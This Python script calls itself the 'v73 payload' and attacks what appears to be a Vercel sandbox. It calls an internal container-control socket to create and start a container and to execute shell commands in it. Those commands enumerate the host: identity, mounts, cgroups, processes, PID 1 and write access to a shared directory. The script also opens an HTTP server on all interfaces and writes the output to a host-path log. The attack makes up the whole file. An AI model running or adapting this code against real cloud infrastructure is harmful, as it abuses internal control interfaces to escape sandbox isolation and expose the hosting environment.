# -*- coding: utf-8 -*-
"""v73 payload: 验证 Exec 真实执行 (json.dumps 构造, 无引号破坏)"""
import socket, time, os, subprocess, json

OUT = '/vercel/sandbox/v73c.out'
SHARE = '/run/vercel/share'
TEST = SHARE + '/exec_test'


def log(s):
    line = '[%.3f] %s' % (time.time(), s)
    for p in (OUT, '/mnt/h/volumes/run/vercel/share/v73c2.out'):
        try:
            open(p, 'a', encoding='utf-8', errors='replace').write(line + '\n')
        except Exception:
            pass
    try:
        print(line, flush=True)
    except Exception:
        pass


def rpc(path, body='{}', t=3):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect('/run/cell/cell.sock')
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/json\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n%s' % (path, len(body), body))
        s.sendall(req.encode())
        data = b''
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', ''
        head, _, rest = data.partition(b'\r\n\r\n')
        return head.split(b'\r\n')[0].decode(errors='replace'), rest[:500].decode(errors='replace')
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, ''


def exec_cmd(ctr, cid, argv, t=6):
    body = json.dumps({"containerId": cid, "process": {"argv": argv}})
    return rpc(ctr + '/Exec', body, t=t)


def main():
    log('V73 payload start pid=%d' % os.getpid())
    CTR = '/vercel.hive.cell.api.containers.v1.ContainersService'

    st, bd = rpc(CTR + '/Create', '{"drive_id":"sandbox"}')
    cid = bd.split('"containerId":"')[1].split('"')[0] if '"containerId"' in bd else None
    log('ID=%s' % (cid or 'NONE'))
    if not cid:
        log('V73C_DONE')
        return
    rpc(CTR + '/Start', '{"containerId":"%s"}' % cid, t=5)
    log('started')
    time.sleep(1)

    cmdA = ('id > /run/vercel/share/exec_test 2>&1; '
            'echo ===HOSTNAME=== >> /run/vercel/share/exec_test; hostname >> /run/vercel/share/exec_test 2>&1; '
            'echo ===PWD=== >> /run/vercel/share/exec_test; pwd >> /run/vercel/share/exec_test 2>&1; '
            'echo ===MOUNT=== >> /run/vercel/share/exec_test; mount >> /run/vercel/share/exec_test 2>&1; '
            'echo ===ROOTLS=== >> /run/vercel/share/exec_test; ls -la / >> /run/vercel/share/exec_test 2>&1; '
            'echo ===CGROUP=== >> /run/vercel/share/exec_test; cat /proc/self/cgroup >> /run/vercel/share/exec_test 2>&1; '
            'echo ===SHARE=== >> /run/vercel/share/exec_test; ls -la /run/vercel/share/ >> /run/vercel/share/exec_test 2>&1; '
            'echo ===PROC1=== >> /run/vercel/share/exec_test; tr '
            "'\\0' ' ' < /proc/1/cmdline >> /run/vercel/share/exec_test 2>&1; "
            'echo ===PROCS=== >> /run/vercel/share/exec_test; ps -ef >> /run/vercel/share/exec_test 2>&1; '
            'echo ===WRITE_TEST=== >> /run/vercel/share/exec_test; '
            'touch /run/vercel/share/write_ok && echo WRITABLE >> /run/vercel/share/exec_test || echo NOWRITE >> /run/vercel/share/exec_test; '
            'echo ===DONE=== >> /run/vercel/share/exec_test')
    st, bd = exec_cmd(CTR, cid, ['/bin/sh', '-c', cmdA])
    log('execA -> %s | %s' % (st, bd[:150]))

    cmdB = '/usr/bin/python3 -m http.server 18081 --bind=0.0.0.0'
    st, bd = exec_cmd(CTR, cid, ['/bin/sh', '-c', cmdB])
    log('execB -> %s | %s' % (st, bd[:150]))
    time.sleep(2)

    try:
        r = subprocess.run(['curl', '-sS', '--max-time', '4', 'http://127.0.0.1:18081/'],
                           capture_output=True, timeout=6)
        log('curl18081 rc=%d out=%s err=%s' % (r.returncode, r.stdout[:150], r.stderr[:100]))
    except Exception as e:
        log('curl18081 EXC %s' % type(e).__name__)

    t_wait = 0
    while t_wait < 12:
        time.sleep(1)
        t_wait += 1
        try:
            if os.path.exists(TEST):
                cur = open(TEST, errors='replace').read()
                if cur.strip():
                    log('--- exec_test ---\n%s' % cur[:9000])
                    break
        except Exception:
            pass

    rpc(CTR + '/Kill', '{"containerId":"%s"}' % cid)
    log('killed')
    log('V73C_DONE')


main()
